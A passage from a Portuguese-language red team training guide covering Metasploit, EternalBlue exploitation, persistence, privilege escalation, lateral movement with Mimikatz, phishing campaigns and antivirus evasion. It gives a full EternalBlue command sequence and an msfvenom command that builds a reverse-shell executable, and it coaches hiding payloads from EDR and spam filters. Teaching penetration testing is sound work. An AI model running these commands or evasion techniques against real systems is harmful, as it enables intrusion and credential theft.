4. **XML External Entities (XXE)**  
5. **Broken Access Control**  
6. **Security Misconfiguration**  
7. **Cross-Site Scripting (XSS)**  
8. **Insecure Deserialization**  
9. **Using Components with Known Vulnerabilities**  
10. **Insufficient Logging & Monitoring**  

---

## 🔍 Como usar esse conhecimento no Red Team

```

- Identificar se o alvo está vulnerável a CVEs conhecidos  
- Priorizar testes baseados nas vulnerabilidades mais críticas  
- Usar exploits públicos disponíveis para acelerar a exploração  
- Avaliar controles e defesas contra falhas comuns da OWASP  

---

## ⚙️ Dicas para iniciantes

```

- Acompanhe atualizações periódicas de CVEs e OWASP  
- Utilize bancos como [NVD](https://nvd.nist.gov/) para pesquisa de vulnerabilidades  
- Pratique análise em ambientes de teste antes de atuar em produção  
- Documente vulnerabilidades encontradas para relatórios  

---

## ✅ Conclusão

Conhecer as principais vulnerabilidades da CVE e OWASP é fundamental para o Red Team N1 planejar e executar testes eficazes, contribuindo para uma postura de segurança mais robusta.

---

# 🔴 Red Team N1: Uso do Metasploit Framework para Exploits Simples

O Metasploit Framework é uma das ferramentas mais poderosas e populares para testes de penetração. No nível N1, aprender a usar exploits simples com o Metasploit é essencial para iniciar ataques controlados e entender o processo de exploração.

---

## 🧠 Por que usar o Metasploit?

```

- Biblioteca extensa de exploits e payloads prontos  
- Automatiza grande parte do processo de exploração  
- Permite aprender conceitos de vulnerabilidades na prática  
- Suporte a múltiplas plataformas e serviços  

---

## 🧱 Passos básicos para usar exploits simples

```

1. **Iniciar o Metasploit:**  
   msfconsole

2. **Buscar o exploit desejado:**  
   search <nome_do_exploit>

3. **Selecionar o exploit:**  
   use <caminho_do_exploit>

4. **Configurar o alvo:**  
   set RHOST <IP_do_alvo>  
   set RPORT <porta_do_serviço>

5. **Configurar o payload:**  
   set PAYLOAD <payload_compatível>

6. **Configurar outras opções (ex: LHOST para payload reverso):**  
   set LHOST <seu_IP>

7. **Executar o exploit:**  
   run / exploit

---

## 🔍 Exemplo prático: exploit SMB (MS17-010)

```

msfconsole  
search ms17_010  
use exploit/windows/smb/ms17_010_eternalblue  
set RHOST 192.168.1.100  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.1.50  
exploit

---

## ⚙️ Dicas para Red Team N1

```

- Teste sempre em ambientes controlados e autorizados  
- Estude a documentação de cada exploit para entender pré-requisitos  
- Use payloads compatíveis com o sistema alvo  
- Documente o processo e resultados para aprendizado  

---

## ✅ Conclusão

O Metasploit Framework é uma ferramenta indispensável para o Red Team N1. Dominar o uso de exploits simples permite acelerar o aprendizado e preparar o profissional para desafios mais complexos.

---

# 🔴 Red Team N1: Técnicas de Exploração Manual e Automatizada

Explorar vulnerabilidades é o passo crucial após o reconhecimento. Entender as diferenças entre exploração manual e automatizada ajuda a escolher a melhor abordagem para cada cenário.

---

## 🧠 Exploração Manual

```

- Realizada diretamente pelo analista usando ferramentas e comandos  
- Permite maior controle e customização das ações  
- Útil para ambientes complexos ou onde automação falha  
- Exemplo: usar netcat para abrir uma shell reversa, executar comandos específicos, modificar payloads  

---

## 🧱 Exploração Automatizada

```

- Utiliza ferramentas e frameworks que automatizam o processo  
- Acelera a exploração e permite escalar testes em múltiplos alvos  
- Pode incluir scanners de vulnerabilidades, scripts, Metasploit  
- Exemplo: usar Metasploit para aplicar exploits e payloads automaticamente  

---

## 🔍 Quando usar cada técnica?

```

- Use exploração manual para entender profundamente a vulnerabilidade e adaptar ataques  
- Use exploração automatizada para testes rápidos e abrangentes em múltiplos sistemas  
- Combine ambas para maximizar resultados e eficiência  

---

## ⚙️ Ferramentas comuns

```

- **Manual:** netcat, socat, scripts personalizados, ferramentas CLI  
- **Automatizada:** Metasploit, Nessus, OpenVAS, scanners de vulnerabilidade  

---

## ✅ Dicas para Red Team N1

```

- Sempre pratique exploração em ambientes controlados  
- Documente os passos para aprendizado e replicação  
- Avalie os riscos de causar instabilidade ou danos nos sistemas  
- Aprenda a ajustar e modificar ferramentas para melhor adequação  

---

## ✅ Conclusão

Dominar tanto as técnicas de exploração manual quanto automatizada é essencial para o Red Team N1. Essa versatilidade prepara o profissional para atuar com eficiência em diversos cenários de ataque.

---

# 🔴 Red Team N1: Prática – Explorar Vulnerabilidade Conhecida em Ambiente Controlado

Praticar a exploração de vulnerabilidades conhecidas em um ambiente seguro é fundamental para desenvolver habilidades técnicas, entender os impactos e aprender a controlar riscos durante um ataque real.

---

## 🧠 Objetivos da prática

- Aplicar conceitos teóricos na prática  
- Entender o funcionamento da vulnerabilidade e sua exploração  
- Desenvolver técnicas para controle e pós-exploração  
- Garantir segurança durante o teste, evitando danos reais  

---

## 🧱 Pré-requisitos

```

- Ambiente de laboratório com máquinas vulneráveis (ex: Metasploitable, Windows desatualizado)  
- Ferramentas como Metasploit, nmap e netcat instaladas  
- Permissão e controle para realizar os testes  
```

---

## 🔍 Passo a passo sugerido

```

1. Identifique a vulnerabilidade alvo (ex: CVE-2017-0144 – EternalBlue)  
2. Faça reconhecimento para confirmar o alvo (scan de portas, serviços)  
3. Configure o exploit no Metasploit ou ferramenta manual  
4. Defina payload e parâmetros (IP, portas)  
5. Execute a exploração e observe o resultado  
6. Teste comandos básicos de pós-exploração (ex: abrir shell, coletar dados)  
7. Documente todo o processo e resultados  

---

## ⚙️ Cuidados importantes

```

- Use snapshots para restaurar a máquina rapidamente  
- Nunca execute exploits em ambientes produtivos sem autorização  
- Monitore o impacto no sistema durante o teste  
- Aprenda com falhas e ajuste as técnicas para maior sucesso  

---

## ✅ Benefícios da prática

- Aprofundamento técnico em vulnerabilidades reais  
- Melhora na confiança para executar testes em produção  
- Compreensão dos riscos e mitigação durante exploração  
- Desenvolvimento de habilidades para reportar e mitigar falhas  

---

## ✅ Conclusão

Explorar vulnerabilidades conhecidas em ambientes controlados é uma etapa essencial para o Red Team N1 ganhar experiência prática e atuar com segurança e eficácia em cenários reais.

---

# 🔴 Red Team N1: Técnicas para Manter Acesso (Persistência)

Após explorar uma vulnerabilidade e obter acesso ao sistema, é fundamental garantir que esse acesso seja mantido para permitir ações futuras. Técnicas de persistência são usadas para isso, garantindo que o atacante possa retornar mesmo após reinicializações ou tentativas de limpeza.

---

## 🧠 O que é persistência?

```

- Conjunto de métodos usados para manter o controle sobre um sistema comprometido  
- Permite acesso contínuo mesmo após reboot ou tentativas de remoção  
- Essencial para ataques prolongados e movimentação lateral  

---

## 🧱 Técnicas comuns de persistência

```

- **Criação de contas de usuário escondidas**  
- **Modificação de serviços ou tarefas agendadas (Windows Task Scheduler, cron jobs)**  
- **Manipulação de arquivos de inicialização (ex: autorun, startup folders)**  
- **Instalação de backdoors ou rootkits**  
- **Uso de técnicas de “living off the land” com ferramentas nativas do sistema**  

---

## 🔍 Exemplos práticos

```

- No Windows:  
  - Adicionar usuário com privilégios administrativos via `net user`  
  - Criar tarefa agendada que executa payload a cada reinício  
- No Linux:  
  - Inserir comandos em `.bashrc` ou `crontab`  
  - Modificar scripts de inicialização como `/etc/rc.local`  

---

## ⚙️ Dicas para Red Team N1

```

- Utilize técnicas discretas para evitar detecção por antivírus e EDRs  
- Documente os métodos usados para facilitar limpeza após o teste  
- Teste a persistência após reiniciar o sistema para validar sucesso  
- Combine várias técnicas para maior robustez  

---

## ✅ Conclusão

Dominar técnicas de persistência é crucial para o Red Team N1 garantir acesso contínuo em ambientes comprometidos, ampliando as possibilidades de exploração e coleta de informações.

---

# 🔴 Red Team N1: Escalonamento de Privilégios Local e Remoto

Escalonamento de privilégios é a técnica que permite ao atacante aumentar seus direitos de acesso no sistema, passando de um usuário comum para um nível mais privilegiado (ex: administrador ou root). Essa etapa é fundamental para ampliar o controle e executar ações críticas.

---

## 🧠 Tipos de escalonamento

```

- **Local:** ocorre dentro do próprio sistema onde o atacante já tem acesso limitado  
- **Remoto:** envolve explorar vulnerabilidades em serviços remotos para ganhar privilégios mais altos  

---

## 🧱 Escalonamento local

```

- Exploração de falhas no sistema operacional, drivers ou softwares instalados  
- Uso de exploits públicos para vulnerabilidades conhecidas (ex: CVE específicos)  
- Busca por credenciais armazenadas ou mal protegidas  
- Técnicas comuns:  
  - SUID mal configurado em Linux  
  - Serviços rodando com permissões elevadas  
  - Exploração de vulnerabilidades em kernels ou softwares  

---

## 🧱 Escalonamento remoto

```

- Exploração de falhas em serviços de rede, como SMB, RDP, FTP, entre outros  
- Ataques de força bruta ou exploração de vulnerabilidades para execução remota de código  
- Técnicas comuns:  
  - Exploração de vulnerabilidades como EternalBlue (MS17-010)  
  - Ataques a serviços mal configurados ou expostos  

---

## 🔍 Ferramentas úteis

```

- **Local:** LinPEAS, WinPEAS, PowerUp, sudo exploits  
- **Remoto:** Metasploit Framework, nmap scripts, exploits específicos  

---

## ⚙️ Dicas para Red Team N1

```

- Sempre faça reconhecimento detalhado para identificar possíveis vetores  
- Teste técnicas de escalonamento em ambientes controlados antes de usar em produção  
- Documente os métodos e evidências para relatórios  
- Combine escalonamento com técnicas de persistência para ampliar controle  

---

## ✅ Conclusão

Escalonamento de privilégios é um passo essencial para o Red Team N1 expandir o acesso conquistado e realizar ações avançadas no ambiente comprometido.

---

# 🔴 Red Team N1: Movimentação Lateral Dentro da Rede (Pass-the-Hash, RDP, SMB)

Após obter acesso inicial a um sistema, a movimentação lateral é a técnica usada para explorar outros computadores na rede, aumentando o alcance do atacante e o impacto do ataque.

---

## 🧠 O que é movimentação lateral?

```

- Processo de se mover de um sistema comprometido para outros na mesma rede  
- Permite acesso a recursos adicionais, dados sensíveis e controle mais amplo  
- Explora falhas, credenciais e protocolos para alcançar novos alvos  

---

## 🧱 Técnicas comuns de movimentação lateral

```

- **Pass-the-Hash (PtH):** reutilização de hashes NTLM para autenticação sem conhecer a senha em texto claro  
- **RDP (Remote Desktop Protocol):** acesso remoto a máquinas usando credenciais obtidas  
- **SMB (Server Message Block):** exploração de compartilhamentos e execução remota de comandos  

---

## 🔍 Exemplos práticos

```

- Uso de ferramentas como **Mimikatz** para extrair hashes e credenciais  
- Conexão via RDP com credenciais comprometidas para acessar outros hosts  
- Utilização de **PsExec** para executar comandos remotamente via SMB  

---

## ⚙️ Dicas para Red Team N1

```

- Proteja as credenciais e colete o máximo possível para facilitar movimentação  
- Utilize ferramentas automatizadas para acelerar o processo  
- Sempre realize ações em ambientes controlados e autorizados  
- Documente todos os passos para análise e relatório  

---

## ✅ Conclusão

A movimentação lateral é essencial para expandir o impacto do Red Team dentro da rede. Dominar técnicas como Pass-the-Hash, RDP e SMB prepara o profissional para desafios reais de ataques avançados.

---

# 🔴 Red Team N1: Prática – Simular Movimentação Lateral e Coleta de Credenciais

Realizar simulações práticas de movimentação lateral e coleta de credenciais é fundamental para desenvolver habilidades que permitem expandir o controle dentro da rede durante um ataque.

---

## 🧠 Objetivos da prática

- Executar técnicas reais de movimentação lateral em ambiente controlado  
- Extrair credenciais e hashes para acesso a novos sistemas  
- Entender ferramentas e métodos usados por atacantes  
- Documentar todo o processo para aprendizado e relatório  

---

## 🧱 Pré-requisitos

```

- Ambiente de laboratório com múltiplas máquinas (Windows/Linux) interligadas  
- Ferramentas instaladas: Mimikatz, PsExec, RDP client, ferramentas para extração de hashes  
- Permissão e controle para executar testes  

---

## 🔍 Passo a passo sugerido

```

1. Obtenha acesso inicial a uma máquina alvo (ex: com credenciais limitadas)  
2. Use **Mimikatz** para extrair hashes e credenciais em memória  
3. Utilize técnicas de **Pass-the-Hash** para autenticar em outra máquina  
4. Acesse remotamente via **RDP** ou execute comandos via **PsExec**  
5. Repita o processo para expandir o controle na rede  
6. Documente cada etapa e evidências coletadas  

---

## ⚙️ Cuidados importantes

```

- Realize testes somente em ambientes autorizados e isolados  
- Evite impactos no ambiente para não prejudicar sistemas  
- Utilize snapshots para restaurar máquinas rapidamente após testes  
- Garanta segurança das credenciais coletadas durante o processo  

---

## ✅ Benefícios da prática

- Aprofundamento em técnicas reais de ataque  
- Melhora na coordenação entre coleta de credenciais e movimentação  
- Preparação para cenários reais de ataque e resposta  
- Desenvolvimento de capacidade analítica e documentação técnica  

---

## ✅ Conclusão

Simular movimentação lateral e coleta de credenciais é essencial para o Red Team N1 aprimorar habilidades ofensivas com segurança e eficiência, ampliando o conhecimento prático para ambientes corporativos.

---

# 🔴 Red Team N1: Fundamentos de Engenharia Social e Manipulação Humana

A engenharia social é uma das técnicas mais poderosas e antigas usadas por atacantes para comprometer sistemas por meio da manipulação direta das pessoas. Entender esses fundamentos é essencial para planejar ataques e também para criar defesas eficazes.

---

## 🧠 O que é engenharia social?

```

- Técnica que explora o comportamento humano para obter acesso ou informações confidenciais  
- Baseia-se em manipulação, confiança e exploração de emoções como medo, urgência e curiosidade  
- Pode ser aplicada via telefone, e-mail, redes sociais ou interações presenciais  

---

## 🧱 Principais técnicas de engenharia social

```

- **Phishing:** envio de mensagens falsas para induzir vítimas a revelar dados ou clicar em links maliciosos  
- **Pretexting:** criação de histórias falsas para enganar a vítima e obter informações  
- **Baiting:** oferta de algo atraente para induzir a vítima a agir (ex: pendrive infectado)  
- **Tailgating:** acesso físico não autorizado seguindo alguém que tem permissão  
- **Spear phishing:** ataques direcionados a indivíduos específicos, baseados em informações prévias  

---

## 🔍 Como os Red Teams usam engenharia social

```

- Coleta de informações para construir pretextos convincentes  
- Envio de e-mails e mensagens para induzir ações inseguras  
- Uso de telefonemas para obter dados sensíveis ou acesso físico  
- Integração com ataques técnicos para ampliar impacto  

---

## ⚙️ Dicas para Red Team N1

```

- Respeite sempre limites éticos e legais  
- Planeje com cuidado para evitar causar danos ou constrangimento  
- Combine engenharia social com outras técnicas técnicas para maximizar resultados  
- Documente e analise as respostas para ajustar abordagens futuras  

---

## ✅ Conclusão

Dominar os fundamentos da engenharia social e manipulação humana é vital para o Red Team N1 criar ataques realistas e efetivos, além de compreender melhor os vetores humanos que ameaçam a segurança.

---

# 🔴 Red Team N1: Criação de Campanhas de Phishing e Coleta de Credenciais

Campanhas de phishing são uma das formas mais eficazes de comprometer usuários e obter acesso inicial em ambientes corporativos. Entender como planejar e executar essas campanhas é essencial para o Red Team.

---

## 🧠 O que é phishing?

```

- Técnica de engenharia social que engana usuários para que revelem informações sensíveis  
- Geralmente envolve envio de e-mails ou mensagens falsas com links ou anexos maliciosos  
- Objetivo: coletar credenciais, instalar malware ou ganhar acesso não autorizado  

---

## 🧱 Passos para criar uma campanha de phishing

```

1. **Planejamento:**  
   - Definir objetivo e público-alvo  
   - Escolher abordagem (ex: spear phishing, phishing em massa)  

2. **Coleta de informações:**  
   - Pesquisar detalhes do alvo para criar mensagens convincentes  
   - Usar informações públicas (LinkedIn, redes sociais)  

3. **Criação do conteúdo:**  
   - Desenvolver e-mails, páginas falsas e anexos maliciosos  
   - Usar técnicas para evitar filtros de spam e antivírus  

4. **Execução:**  
   - Enviar e-mails via ferramentas específicas  
   - Monitorar cliques e interações  

5. **Coleta e análise de credenciais:**  
   - Armazenar informações capturadas de forma segura  
   - Analisar dados para próximos passos do ataque  

---

## 🔍 Ferramentas comuns

```

- **Gophish:** plataforma open source para criar e gerenciar campanhas  
- **SET (Social Engineering Toolkit):** automação de ataques sociais  
- **Phishing Frenzy:** framework para phishing profissional  

---

## ⚙️ Cuidados éticos e legais

```

- Execute campanhas apenas em ambientes autorizados e para fins educacionais  
- Informe e prepare a equipe alvo para evitar danos reais  
- Respeite a privacidade e segurança dos usuários envolvidos  
- Documente todas as etapas para análise e aprendizado  

---

## ✅ Conclusão

Criar campanhas de phishing é uma habilidade crítica para o Red Team N1, permitindo testar a segurança humana da organização e identificar vulnerabilidades que técnicas técnicas não alcançam.

---

# 🔴 Red Team N1: Ferramentas para Criação de Páginas Falsas e Envio de Emails (Gophish, SET)

Para executar campanhas de phishing eficazes, é essencial dominar ferramentas que facilitam a criação de páginas falsas e o envio de e-mails maliciosos. Duas das mais usadas são o Gophish e o Social Engineering Toolkit (SET).

---

## 🧠 Por que usar essas ferramentas?

```

- Automatizam o processo de criação e disparo de campanhas  
- Permitem personalizar e-mails e páginas para maior taxa de sucesso  
- Fornecem métricas e relatórios para análise do impacto  
- Facilitam testes controlados e éticos  

---

## 🧱 Gophish

```

- Plataforma open source especializada em campanhas de phishing  
- Interface web amigável para criar e gerenciar campanhas  
- Suporte a templates de e-mails e páginas personalizadas  
- Rastreamento de cliques, envios e respostas  
- Fácil instalação em ambientes Linux/Windows  

🔗 [https://getgophish.com/](https://getgophish.com/)

---

## 🧱 Social Engineering Toolkit (SET)

```

- Ferramenta open source focada em ataques de engenharia social  
- Suporta criação de páginas falsas, envio de e-mails, ataques via USB e mais  
- Automatiza geração de payloads para diversas plataformas  
- Funciona via linha de comando, ideal para usuários avançados  
- Integrável com outras ferramentas para ataques combinados  

🔗 [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)

---

## 🔍 Como usar na prática

```

1. Defina o objetivo da campanha e o público-alvo  
2. Crie templates de e-mails e páginas de phishing com as ferramentas  
3. Configure servidores para hospedagem das páginas falsas  
4. Dispare e-mails e monitore as interações  
5. Colete credenciais e dados para análise  

---

## ⚙️ Dicas para Red Team N1

```

- Sempre realize testes em ambientes controlados e autorizados  
- Customize mensagens para parecerem legítimas e evitar filtros  
- Use relatórios para melhorar campanhas futuras  
- Documente processos para aprendizado e compliance  

---

## ✅ Conclusão

Dominar o Gophish e o SET é fundamental para o Red Team N1 executar campanhas de phishing profissionais e seguras, elevando a eficácia dos testes de engenharia social.

---

# 🔴 Red Team N1: Prática – Montar e Executar Campanha de Phishing Simulada

Realizar uma campanha de phishing simulada em ambiente controlado é fundamental para entender os processos, ferramentas e desafios envolvidos em ataques reais.

---

## 🧠 Objetivos da prática

- Planejar e criar uma campanha de phishing realista  
- Configurar ferramentas para envio e monitoramento  
- Coletar e analisar interações e credenciais simuladas  
- Documentar todo o processo para aprendizado e melhorias  

---

## 🧱 Pré-requisitos

```

- Ambiente de laboratório isolado ou ambiente autorizado para testes  
- Ferramentas instaladas: Gophish ou Social Engineering Toolkit (SET)  
- Template de e-mail e página falsa preparada  
- Permissões claras para executar o teste  

---

## 🔍 Passo a passo sugerido

```

1. Defina o objetivo e escopo da campanha (ex: conscientização interna)  
2. Monte a lista de usuários-alvo (simulados ou reais com autorização)  
3. Configure a ferramenta escolhida (Gophish/SET) para criar e enviar e-mails  
4. Crie ou importe templates de e-mail e páginas de phishing  
5. Hospede as páginas falsas em servidor controlado  
6. Envie a campanha e monitore cliques, respostas e coleta de dados  
7. Analise resultados e prepare relatório de lições aprendidas  

---

## ⚙️ Cuidados importantes

```

- Sempre informe os envolvidos sobre a simulação (quando aplicável)  
- Evite causar pânico ou danos reais  
- Respeite a privacidade e segurança dos dados coletados  
- Use snapshots ou backups para restaurar ambientes após o teste  

---

## ✅ Benefícios da prática

- Melhora a compreensão prática da engenharia social  
- Avalia a efetividade das defesas humanas da organização  
- Prepara a equipe para reconhecer e responder a ataques reais  
- Fornece dados para aprimorar treinamentos e políticas de segurança  

---

## ✅ Conclusão

Montar e executar campanhas de phishing simuladas é uma habilidade essencial para o Red Team N1, permitindo aplicar conhecimentos técnicos e sociais em ambientes seguros e controlados.

---

# 🔴 Red Team N2: Criar Payloads Usando Ferramentas como msfvenom

Criar payloads personalizados é uma habilidade essencial para o Red Team N2, permitindo desenvolver ataques mais furtivos e adaptados ao ambiente alvo.

---

## 🧠 O que é msfvenom?

```

- Ferramenta do Metasploit Framework para gerar payloads e shellcodes  
- Combina funcionalidades do msfpayload e msfencode  
- Permite criar payloads para diversas plataformas, formatos e arquiteturas  
- Suporta encoding para evitar detecção por antivírus  

---

## 🧱 Passos básicos para criar um payload

```

1. Escolha o tipo de payload (ex: reverse shell, bind shell)  
2. Defina plataforma e arquitetura (Windows, Linux, x86, x64)  
3. Configure parâmetros como IP e porta do listener (LHOST, LPORT)  
4. Selecione formato de saída (exe, dll, elf, etc.)  
5. Utilize opções de encoding para evitar detecção  

---

## 🔍 Exemplo prático: criar um payload reverse shell Windows

```

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

---

## ⚙️ Dicas para Red Team N2

```

- Teste payloads em ambientes controlados antes de usar em produção  
- Combine msfvenom com outras ferramentas para customizar payloads  
- Utilize técnicas de ofuscação para aumentar furtividade  
- Documente configurações e parâmetros usados para replicar e ajustar  

---

## ✅ Conclusão

Dominar a criação de payloads com msfvenom eleva o nível técnico do Red Team N2, proporcionando ataques mais sofisticados e eficazes.

---

# 🔴 Red Team N2: Introdução a Técnicas de Obfuscação e Evasão

Para aumentar a eficácia dos ataques, é fundamental que o Red Team N2 conheça técnicas de obfuscação e evasão que dificultam a detecção por antivírus, EDRs e outras ferramentas de defesa.

---

## 🧠 O que é obfuscação e evasão?

```

- **Obfuscação:** técnicas usadas para esconder ou dificultar a análise de código malicioso  
- **Evasão:** métodos para evitar a detecção por ferramentas de segurança, como antivírus, firewalls e sistemas de detecção  

---

## 🧱 Técnicas comuns de obfuscação

```

- Ofuscação de código (ex: criptografia, encoding, packing)  
- Uso de scripts e macros complexos  
- Técnicas de polimorfismo e metamorfismo  
- Compressão e empacotamento de executáveis  

---

## 🧱 Técnicas comuns de evasão

```

- Detecção de sandbox e ambiente virtual para não executar em análise  
- Uso de delay ou gatilhos para execução tardia  
- Modificação de assinaturas para evitar detecção por antivírus  
- Uso de protocolos e canais cifrados para comunicação  

---

## 🔍 Ferramentas úteis

```

- **Obfuscação:** Veil-Evasion, Hyperion, UPX  
- **Evasão:** Cobalt Strike, Metasploit com custom payloads  
- Scripts personalizados e técnicas manuais  

---

## ⚙️ Dicas para Red Team N2

```

- Teste os payloads em múltiplos ambientes para validar evasão  
- Combine técnicas de obfuscação para dificultar a análise estática e dinâmica  
- Esteja atento às atualizações das defesas para adaptar suas técnicas  
- Documente métodos usados para aprimorar e replicar ataques  

---

## ✅ Conclusão

Conhecer e aplicar técnicas de obfuscação e evasão é crucial para o Red Team N2 realizar ataques furtivos e eficientes, aumentando a chance de sucesso e evitando a detecção precoce.

---

# 🔴 Red Team N2: Ferramentas para Geração e Entrega de Payloads

Para executar ataques avançados, o Red Team N2 deve dominar ferramentas que auxiliam na criação e entrega de payloads, permitindo maior controle e flexibilidade durante as operações ofensivas.

---

## 🧠 Por que usar ferramentas de geração e entrega?

```

- Facilitam a criação de payloads personalizados para diferentes ambientes  
- Permitem entrega eficiente e furtiva em alvos específicos  
- Automatizam processos complexos e aumentam a eficácia do ataque  
- Integram múltiplas técnicas para superar defesas modernas  

---

## 🧱 Ferramentas populares para geração de payloads

```

- **msfvenom:** componente do Metasploit para criação de payloads customizados  
- **Veil-Evasion:** ferramenta para criar payloads ofuscados e evitar detecção  
- **PowerShell Empire:** framework para geração e entrega de payloads via PowerShell  

---

## 🧱 Ferramentas populares para entrega de payloads

```

- **Metasploit Framework:** oferece diversos vetores de entrega, incluindo exploits, phishing e execução remota  
- **Cobalt Strike:** plataforma avançada para comando e controle e entrega de payloads  
- **Social Engineering Toolkit (SET):** usada para campanhas de phishing e engenharia social  

---

## 🔍 Como funcionam na prática

```

1. Crie o payload usando ferramenta de geração (ex: msfvenom, Veil)  
2. Escolha o vetor de entrega adequado ao alvo (phishing, exploit, USB, etc.)  
3. Configure a ferramenta de entrega para disparar o payload  
4. Monitore a conexão reversa e controle remoto do payload  
5. Use técnicas de evasão para manter acesso sem ser detectado  

---

## ⚙️ Dicas para Red Team N2

```

- Sempre teste payloads em ambientes isolados para garantir funcionamento  
- Combine diferentes ferramentas para criar campanhas mais sofisticadas  
- Mantenha-se atualizado com as últimas técnicas de evasão e entrega  
- Documente cada etapa para replicação e análise pós-ação  

---

## ✅ Conclusão

Dominar ferramentas para geração e entrega de payloads é fundamental para o Red Team N2 ampliar suas capacidades ofensivas, realizando ataques mais furtivos, eficazes e adaptados ao ambiente alvo.

---

# 🔴 Red Team N2: Estudar Principais Técnicas de Detecção e Defesa Usadas por Blue Teams

Para aprimorar suas habilidades ofensivas, o Red Team N2 deve conhecer as técnicas que os Blue Teams utilizam para detectar e mitigar ataques, permitindo planejar ações mais eficazes e furtivas.

---

## 🧠 Por que estudar técnicas de defesa?

```

- Compreender os mecanismos de detecção ajuda a evitar ser identificado  
- Permite desenvolver estratégias para contornar defesas e manter acesso  
- Facilita a criação de ataques mais sofisticados e realistas  
- Melhora a colaboração e aprendizado entre equipes Red e Blue  

---

## 🧱 Principais técnicas de detecção usadas por Blue Teams

```

- **Monitoramento de logs:** análise contínua de eventos de segurança em sistemas e redes  
- **Detecção baseada em assinaturas:** uso de regras para identificar padrões conhecidos de ataques  
- **Análise comportamental:** identificação de atividades anômalas que indicam possível comprometimento  
- **Integração SIEM e SOAR:** centralização e automação da resposta a incidentes  
- **EDR (Endpoint Detection and Response):** monitoramento detalhado em endpoints para detectar comportamentos suspeitos  

---

## 🧱 Técnicas comuns de defesa e mitigação

```

- **Segmentação de rede e controle de acesso:** limita movimentação lateral e exposição  
- **Atualizações e patches:** corrigem vulnerabilidades conhecidas  
- **Treinamento e conscientização:** reduz risco de engenharia social  
- **Backups e planos de recuperação:** minimizam impacto de incidentes  
- **Implementação de políticas de segurança:** governança eficaz para proteger ativos  

---

## 🔍 Como usar esse conhecimento no Red Team

```

- Ajustar payloads para evitar assinaturas e comportamentos detectáveis  
- Planejar ataques que explorem brechas nas defesas e evitem monitoramento  
- Testar técnicas de evasão específicas contra EDRs e SIEMs  
- Simular ataques realistas para treinar Blue Teams e melhorar defesas  

---

## ⚙️ Dicas para Red Team N2

```

- Estude cases reais de incidentes e resposta para entender dinâmicas de defesa  
- Use laboratórios e ambientes simulados para validar técnicas ofensivas e defensivas  
- Mantenha-se atualizado com novidades em ferramentas e técnicas de defesa  
- Documente descobertas para compartilhar com sua equipe e aprimorar estratégias  

---

## ✅ Conclusão

Conhecer as técnicas de detecção e defesa dos Blue Teams é essencial para o Red Team N2 executar ataques mais furtivos e eficazes, elevando a qualidade e realismo dos testes de segurança.

---

# 🔴 Red Team N2: Técnicas de Evasão de Sandbox e Análise Estática/Dinâmica

Para aumentar a furtividade e eficácia dos ataques, o Red Team N2 deve dominar técnicas que evitem a detecção por sandboxes e análises automatizadas, tanto estáticas quanto dinâmicas.

---

## 🧠 O que são sandboxes e análises estáticas/dinâmicas?

```

- **Sandbox:** ambiente isolado onde malware é executado para observar seu comportamento  
- **Análise estática:** exame do código ou arquivo sem executá-lo, buscando padrões e características suspeitas  
- **Análise dinâmica:** execução controlada do malware para monitorar ações em tempo real  

---

## 🧱 Técnicas comuns de evasão de sandbox

```

- Detecção de ambiente virtual ou sandbox (ex: drivers, processos, registros específicos)  
- Delay na execução de payload para evitar análise rápida  
- Verificação de presença de usuários ativos (input do mouse, teclado)  
- Execução condicional baseada em características do ambiente  
- Criptografia ou packing do payload para dificultar análise  

---

## 🧱 Técnicas de evasão de análise estática

```

- Ofuscação de código e strings (ex: base64, XOR, compressão)  
- Utilização de polymorphism e metamorphism para alterar a assinatura do código  
- Fragmentação e segmentação do código para evitar assinaturas diretas  
- Inclusão de código morto ou confuso para enganar analisadores  

---

## 🔍 Ferramentas e métodos usados

```

- Packers e crypters como UPX, Themida, Veil-Evasion  
- Ferramentas customizadas para obfuscação e manipulação de código  
- Técnicas avançadas integradas em frameworks como Cobalt Strike  

---

## ⚙️ Dicas para Red Team N2

```

- Teste os payloads em múltiplos ambientes para validar evasão  
- Combine técnicas de evasão para aumentar a dificuldade da análise  
- Atualize-se constantemente sobre novas detecções e contramedidas  
- Documente os métodos usados para replicar e aprimorar ataques  

---

## ✅ Conclusão

Dominar técnicas de evasão contra sandbox e análise estática/dinâmica é vital para o Red Team N2 garantir ataques mais furtivos, dificultando a detecção e análise por equipes de defesa.

---

# 🔴 Red Team N2: Prática – Testar Evasão de Payloads Contra Ferramentas de Defesa

Realizar testes práticos de evasão de payloads contra antivírus, EDRs e sandboxes é fundamental para validar a eficácia das técnicas e melhorar a furtividade dos ataques.

---

## 🧠 Objetivos da prática

- Avaliar se payloads criados conseguem escapar da detecção  
- Testar diferentes métodos de obfuscação e encoding  
- Analisar o comportamento das ferramentas de defesa diante do payload  
- Ajustar técnicas para melhorar a evasão  

---

## 🧱 Pré-requisitos

```

- Ambiente de laboratório controlado com ferramentas de defesa instaladas (antivírus, EDR, sandbox)  
- Payloads criados com diferentes níveis de obfuscação  
- Ferramentas para monitorar detecção e resposta (logs, alertas)  

---

## 🔍 Passo a passo sugerido

```

1. Prepare o ambiente com as soluções de segurança ativas  
2. Execute o payload original e registre o comportamento e detecção  
3. Aplique técnicas de obfuscação/encoding no payload (ex: Veil-Evasion, msfvenom encoders)  
4. Reexecute o payload obfuscado e compare os resultados  
5. Teste variações adicionais como delay na execução, checks de ambiente  
6. Documente quais técnicas foram mais eficazes para evasão  

---

## ⚙️ Cuidados importantes

```

- Use ambientes isolados para evitar impacto em sistemas produtivos  
- Mantenha controle rigoroso sobre payloads e resultados  
- Respeite políticas de segurança e autorizações para testes  
- Faça backup e snapshots para restaurar o ambiente rapidamente  

---

## ✅ Benefícios da prática

- Melhora a qualidade e furtividade dos payloads  
- Identifica pontos fracos nas técnicas de evasão  
- Aprimora conhecimento sobre funcionamento de ferramentas de defesa  
- Prepara o Red Team para ataques mais sofisticados e realistas  

---

## ✅ Conclusão

Testar evasão de payloads contra ferramentas de defesa é uma etapa essencial para o Red Team N2 validar e aprimorar suas técnicas, garantindo maior sucesso em operações ofensivas.

---

# 🔴 Red Team N2: Programação Básica em Python e PowerShell para Automação

Dominar noções básicas de programação em Python e PowerShell é fundamental para o Red Team N2 automatizar tarefas repetitivas, criar scripts personalizados e aumentar a eficiência das operações.

---

## 🧠 Por que aprender Python e PowerShell?

```

